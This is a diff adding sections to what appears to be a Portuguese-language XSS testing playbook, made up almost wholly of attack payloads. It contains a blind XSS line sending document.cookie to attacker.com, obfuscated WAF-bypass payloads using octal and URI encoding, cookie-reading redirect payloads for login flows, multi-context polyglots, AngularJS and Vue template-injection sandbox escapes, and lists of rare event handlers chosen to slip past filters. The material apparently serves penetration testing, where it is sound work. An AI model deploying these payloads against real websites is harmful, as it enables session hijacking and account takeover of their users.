@@ -103,6 +103,92 @@ Blind XSS:
 <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
 ```
 
+WAF bypass avancado (fontes: xsswafbypss.txt, xss.txt):
+```text
+# Caracteres Unicode math (bypass de filtro por nome de tag)
+"><svg+onload=confirm(cookie)>
+# Versao com Unicode math bold: "><U+1D600U+1D617U+1D606+U+1D60EU+1D60FU+1D60BU+1D60EU+1D600U+1D603=U+1D602U+1D60EU+1D60FU+1D605U+1D60AU+1D60DU+1D60E(U+1D602U+1D60EU+1D60EU+1D60CU+1D60AU+1D604)>
+
+# Constructors ofuscados via octal escape
+<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164\50\61\51')()">
+
+# Import dinamico (bypass de inline script filter)
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+
+# SVG base64 use (bypass de sanitizacao de tag)
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcg...#x" /></svg>
+
+# Reflect.get (bypass de keyword filter)
+<a/href="javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">ClickMe
+
+# Form event (onformdata)
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+
+# Popover + onbeforetoggle
+javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
+
+# window.valueOf trick
+<Script>window.valueOf=alert;window%2B1</Script>
+
+# Location hash redirect
+<svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
+
+# Triple encode + fromCharCode
+"><input%252bTyPE%25253d"hxlxmj"%252b...%252bAuToFOcus>
+
+# decodeURIComponent chain
+<div onpointerover="[][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')][decodeURIComponent('%63%6F%6E%73%74%72%75%63%74%6F%72')](decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))()">
+
+# Accesskey + onclick chain
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+
+# atob eval via source onerror
+<video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9j...>
+
+# EMBED com SVG base64
+<EMBED SRC="data:image/svg+xml;base64,PHN2Zy..." type="image/svg+xml" AllowScriptAccess="always">
+
+# Redirect-based (login flow)
+/path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
+login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
+```
+
+Polyglots universais (fontes: xsspollygots.txt):
+```text
+# Polyglot multi-contexto: HTML, atributo, script, URL, style, textarea, title, comment
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Breakout de noscript/noembed/select
+<select><noembed></select><script x='a@b'a> y='a@b'//a@b%0aalert('XSS')</script x>
+
+# Breakout de closing tags
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//attacker\76-->
+
+# Polyglot compacto multi-encoding
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+```
+
+Angular/Vue template injection:
+```text
+# AngularJS sandbox bypass
+{{constructor.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{$on.constructor('alert(1)')()}}
+
+# Vue.js
+{{$eval.constructor('alert(1)')()}}
+
+# AngularJS class-based
+{{'a'['const'+'ructor']['prot'+'otype']['char'+'At']=[]['join'];$eval('x=alert(1)');}}
+```
+
+Event handlers incomuns (bypass de WAF que filtra onclick/onerror/onload):
+```text
+onpointerrawupdate, onauxclick, onformdata, onbeforetoggle
+onpointerenter, ontoggle, onpointerover, onsecuritypolicyviolation
+onanimationend, ontransitionend, onwheel, ongotpointercapture
+```
+
 Casos reais e mentalidade de ataque (RWBH): Twitter (stored XSS em perfis/tweets), Yahoo (parâmetros de busca refletidos) e Uber (painéis de suporte) mostram que o contexto dita o payload; o atacante testa HTML, atributo, JavaScript, URL e DOM.
 
 ## Target Context (Crawler Hints)
